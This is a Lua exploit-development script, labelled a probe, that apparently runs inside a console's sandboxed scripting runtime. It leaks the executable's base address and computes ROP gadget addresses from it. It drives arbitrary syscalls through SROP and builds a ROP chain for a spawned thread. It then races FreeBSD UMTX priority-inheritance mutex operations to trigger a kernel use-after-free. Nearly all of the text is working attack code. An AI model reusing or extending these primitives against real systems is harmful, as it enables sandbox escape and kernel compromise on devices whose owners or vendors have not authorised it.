-- CRASH_CLASS: MODERATE
-- PROBE 146a: UMTX PI-mutex race — test lock/unlock + threaded race
--
-- FreeBSD PI-mutex handling has had TOCTOU bugs in priority inheritance chain.
-- We have: threading (thr_create), SROP for arbitrary syscalls, GPU shared memory.
-- Strategy:
--   1. Verify MUTEX_LOCK (op 5) and MUTEX_UNLOCK (op 6) with PI flags
--   2. Thread A locks, main thread tries to lock (should block or return TID)
--   3. Thread B unlocks while main is setting up PI chain → potential UAF

print("=== PROBE 146a: UMTX PI RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- Eboot base for gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

-- GPU memory for shared data
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

-- Gadgets
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- [A] Test basic UMTX_OP_MUTEX_LOCK/UNLOCK via SROP
print("--- [A] UMTX BASIC ---")

-- struct umutex at GPU + 0x0000
local mtx = gpu
local mtx_addr = uint64(string.format("0x%X%08X", gh, gl))
-- m_owner = 0 (unlocked)
wd(mtx, 0)
-- m_flags = 0 (normal mutex, no PI first)
wd(mtx + 4, 0)
-- zero rest
for i = 8, 47, 4 do wd(mtx + i, 0) end

-- _umtx_op(obj, op, val, uaddr1, uaddr2) = sys 454
-- MUTEX_LOCK: op=5
print("lock_normal")
local lock_rv = srop(454, uint64(mtx_addr), uint64(5), uint64(0), uint64(0), uint64(0))
local lock_v = lock_rv and to_num(lock_rv) or -999
print("lock=" .. lock_v)

-- Check m_owner after lock
local owner = to_num(memory.read_dword(mtx))
print("m_owner=" .. owner .. " (pid=" .. pid .. ")")

-- MUTEX_UNLOCK: op=6
print("unlock_normal")
local unlock_rv = srop(454, uint64(mtx_addr), uint64(6), uint64(0), uint64(0), uint64(0))
local unlock_v = unlock_rv and to_num(unlock_rv) or -999
print("unlock=" .. unlock_v)

local owner2 = to_num(memory.read_dword(mtx))
print("m_owner_post=" .. owner2)

-- [B] PI mutex
print("")
print("--- [B] PI MUTEX ---")
local pi_mtx = gpu + 0x100
local pi_addr = uint64(string.format("0x%X%08X", gh, gl + 0x100))
wd(pi_mtx, 0)        -- m_owner = 0
wd(pi_mtx + 4, 4)    -- m_flags = UMUTEX_PRIO_INHERIT (0x4)
for i = 8, 47, 4 do wd(pi_mtx + i, 0) end

print("lock_pi")
local pi_lock = srop(454, uint64(pi_addr), uint64(5), uint64(0), uint64(0), uint64(0))
print("pi_lock=" .. (pi_lock and tostring(to_num(pi_lock)) or "nil"))
local pi_owner = to_num(memory.read_dword(pi_mtx))
print("pi_m_owner=" .. pi_owner)

print("unlock_pi")
local pi_unlock = srop(454, uint64(pi_addr), uint64(6), uint64(0), uint64(0), uint64(0))
print("pi_unlock=" .. (pi_unlock and tostring(to_num(pi_unlock)) or "nil"))
local pi_owner2 = to_num(memory.read_dword(pi_mtx))
print("pi_m_owner_post=" .. pi_owner2)

-- [C] Threaded lock contention
print("")
print("--- [C] THREADED RACE ---")

-- Prepare mutex for race
local race_mtx = gpu + 0x200
local race_addr = uint64(string.format("0x%X%08X", gh, gl + 0x200))
wd(race_mtx, 0)
wd(race_mtx + 4, 4)  -- PI flag
for i = 8, 47, 4 do wd(race_mtx + i, 0) end

-- Lock the mutex from main thread first
local rl1 = srop(454, uint64(race_addr), uint64(5), uint64(0), uint64(0), uint64(0))
print("main_lock=" .. (rl1 and tostring(to_num(rl1)) or "nil"))
local ro1 = to_num(memory.read_dword(race_mtx))
print("race_owner=" .. ro1)

-- Create child thread that will try to lock (should block since main holds it)
-- The child thread ROP chain:
-- 1. nanosleep 50ms (let main thread proceed)
-- 2. _umtx_op(race_mtx, MUTEX_LOCK, 0, NULL, NULL) via syscall
-- 3. Write marker to done buffer
-- 4. _umtx_op(race_mtx, MUTEX_UNLOCK, 0, NULL, NULL)
-- 5. Park on long sleep

local done_c = gpu + 0x10000
wq(done_c, uint64(0))
local done_c_addr = uint64(string.format("0x%X%08X", gh, gl + 0x10000))

local ts_short = gpu + 0x11000
wq(ts_short, uint64(0))
wq(ts_short + 8, uint64(50000000))
local ts_short_a = uint64(string.format("0x%X%08X", gh, gl + 0x11000))

local ts_long = gpu + 0x11100
wq(ts_long, uint64(30))
wq(ts_long + 8, uint64(0))
local ts_long_a = uint64(string.format("0x%X%08X", gh, gl + 0x11100))

-- Build ROP chain for child: lock the PI mutex via syscall
-- syscall(454, race_addr, 5, 0, 0, 0)
-- We need: RAX=454, RDI=race_addr, RSI=5, RDX=0, R10=0, R8=0, R9=0
-- Only have pop_rdi, pop_rsi, pop_rax, no pop_rdx/r10/r8/r9
-- RDX/R10/R8/R9 come from thread context (set at creation)

local rop_c = gpu + 0x20000
local rop_c_a = uint64(string.format("0x%X%08X", gh, gl + 0x20000))
local i = 0

-- Step 1: nanosleep 50ms
wq(rop_c+i, g_pop_rdi); i=i+8
wq(rop_c+i, ts_short_a); i=i+8
wq(rop_c+i, g_pop_rsi); i=i+8
wq(rop_c+i, uint64(0)); i=i+8
wq(rop_c+i, g_pop_rax); i=i+8
wq(rop_c+i, uint64(240)); i=i+8
wq(rop_c+i, sc_addr); i=i+8

-- Step 2: _umtx_op lock (454)
-- RDI=race_addr, RSI=5(MUTEX_LOCK), RAX=454
-- RDX/R10/R8/R9 must be 0 from context
wq(rop_c+i, g_pop_rdi); i=i+8
wq(rop_c+i, race_addr); i=i+8
wq(rop_c+i, g_pop_rsi); i=i+8
wq(rop_c+i, uint64(5)); i=i+8
wq(rop_c+i, g_pop_rax); i=i+8
wq(rop_c+i, uint64(454)); i=i+8
wq(rop_c+i, sc_addr); i=i+8

-- Step 3: Write done marker
wq(rop_c+i, g_pop_rax); i=i+8
wq(rop_c+i, uint64("0x00000000BEEF0001")); i=i+8
wq(rop_c+i, g_pop_rdi); i=i+8
wq(rop_c+i, done_c_addr); i=i+8
wq(rop_c+i, g_wr); i=i+8

-- Step 4: Unlock
wq(rop_c+i, g_pop_rdi); i=i+8
wq(rop_c+i, race_addr); i=i+8
wq(rop_c+i, g_pop_rsi); i=i+8
wq(rop_c+i, uint64(6)); i=i+8
wq(rop_c+i, g_pop_rax); i=i+8
wq(rop_c+i, uint64(454)); i=i+8
wq(rop_c+i, sc_addr); i=i+8

-- Step 5: Park
wq(rop_c+i, g_pop_rdi); i=i+8
wq(rop_c+i, ts_long_a); i=i+8
wq(rop_c+i, g_pop_rsi); i=i+8
wq(rop_c+i, uint64(0)); i=i+8
wq(rop_c+i, g_pop_rax); i=i+8
wq(rop_c+i, uint64(240)); i=i+8
wq(rop_c+i, sc_addr); i=i+8

-- Thread context — set RDX, R10, R8, R9 to 0 in the mcontext
local tctx_c = gpu + 0x30000
for off = 0, 0x4FF, 4 do wd(tctx_c + off, 0) end
pcall(function() return sc_gc(uint64(tctx_c)) end)
wq(tctx_c + 0xE0, g_ret)          -- RIP = ret gadget
wq(tctx_c + 0xF8, rop_c_a)        -- RSP = ROP chain
-- Zero RDX, R10, R8, R9 in context for syscall args
wq(tctx_c + MC + 0x18, uint64(0)) -- RDX
wq(tctx_c + MC + 0x50, uint64(0)) -- R10
wq(tctx_c + MC + 0x28, uint64(0)) -- R8
wq(tctx_c + MC + 0x30, uint64(0)) -- R9

local tbuf_c = gpu + 0x40000
wq(tbuf_c, uint64(0))

print("launching child thread")
local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(tctx_c), uint64(tbuf_c), uint64(0))
end)
print("thr_create=" .. tostring(rv_t))

-- Wait 100ms for child to reach the MUTEX_LOCK (it should block since main holds lock)
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(100000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

-- Check child's done marker (should still be 0 since lock is held by main)
local dc1 = memory.read_qword(done_c)
local dc1h, dc1l = get_hi_lo(dc1)
print("child_done_100ms=0x" .. string.format("%08X", dc1l))

-- Check m_owner (should still be main's TID)
local ro2 = to_num(memory.read_dword(race_mtx))
print("race_owner_100ms=" .. ro2)

-- Now unlock from main — child should wake up and acquire
print("main_unlock")
local ru1 = srop(454, uint64(race_addr), uint64(6), uint64(0), uint64(0), uint64(0))
print("main_unlock_rv=" .. (ru1 and tostring(to_num(ru1)) or "nil"))

-- Wait 200ms for child to acquire and release
wq(tw + 8, uint64(200000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local dc2 = memory.read_qword(done_c)
local dc2h, dc2l = get_hi_lo(dc2)
print("child_done_300ms=0x" .. string.format("%08X", dc2l))

local ro3 = to_num(memory.read_dword(race_mtx))
print("race_owner_300ms=" .. ro3)

-- [D] Rapid lock/unlock race with 2 threads
print("")
print("--- [D] RAPID RACE ---")

local race2_mtx = gpu + 0x300
local race2_addr = uint64(string.format("0x%X%08X", gh, gl + 0x300))
wd(race2_mtx, 0)
wd(race2_mtx + 4, 4) -- PI
for off = 8, 47, 4 do wd(race2_mtx + off, 0) end

-- Rapid lock/unlock from main thread 100 times
local err_count = 0
for iter = 1, 100 do
    local lrv = srop(454, uint64(race2_addr), uint64(5), uint64(0), uint64(0), uint64(0))
    if lrv == nil then err_count = err_count + 1; break end
    local urv = srop(454, uint64(race2_addr), uint64(6), uint64(0), uint64(0), uint64(0))
    if urv == nil then err_count = err_count + 1; break end
end
print("rapid100=" .. (100 - err_count) .. "/100 ok")

local ro4 = to_num(memory.read_dword(race2_mtx))
print("race2_owner_final=" .. ro4)

-- Monitor sys 624 for VM ops count changes during mutex operations
local vm_before = srop(624)
local vm_b = vm_before and to_num(vm_before) or 0
-- Do 50 more lock/unlock
for iter = 1, 50 do
    srop(454, uint64(race2_addr), uint64(5), uint64(0), uint64(0), uint64(0))
    srop(454, uint64(race2_addr), uint64(6), uint64(0), uint64(0), uint64(0))
end
local vm_after = srop(624)
local vm_a = vm_after and to_num(vm_after) or 0
print("vm_ops_delta=" .. (vm_a - vm_b) .. " (50 lock/unlock)")

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
